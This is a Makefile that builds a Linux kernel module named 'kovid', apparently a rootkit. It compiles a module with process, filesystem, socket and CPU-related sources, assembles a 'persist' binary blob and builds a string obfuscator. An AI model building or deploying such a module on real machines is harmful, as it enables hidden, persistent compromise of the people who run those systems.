OBJNAME=kovid

# turn off ring buffer debug:
# $ DEPLOY=1 make
ifndef DEPLOY
DEBUG_PR := -DDEBUG_RING_BUFFER
endif

LD=$(shell which ld)
AS=$(shell which as)
CTAGS=$(shell which ctags))
# PROCNAME, /proc/<name>, change this if you wish
COMPILER_OPTIONS := -Wall -DPROCNAME='"kovid"' \
	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK -DPRCTIMEOUT=1200

EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}

SRC := src/${OBJNAME}.c src/pid.c src/fs.c src/sys.c \
	src/sock.c src/whatever.c src/vm.c

persist=src/persist
obf=tools/obfstr

$(OBJNAME)-objs = $(SRC:.c=.o)

obj-m := ${OBJNAME}.o

CC=gcc

all: persist obf
	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	$(CC) ./tests/test.c -o ./tests/test
	$(CC) ./tests/test_fork.c -o ./tests/test_fork

persist:
	$(AS) --64 $(persist).S -statistics -fatal-warnings \
		-size-check=error -o $(persist).o
	$(LD) -Ttext 200000 --oformat binary -o $(persist) $(persist).o

obf:
	$(CC) $(obf).c -o $(obf)

clean:
	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	@rm -f *.o src/*.o $(persist)
	@rm -f ./tests/test ./tests/test_fork
	@rm -f tools/obfstr
	@echo "Clean."

tags:
	$(CTAGS) -RV src/.

.PHONY: all clean tags
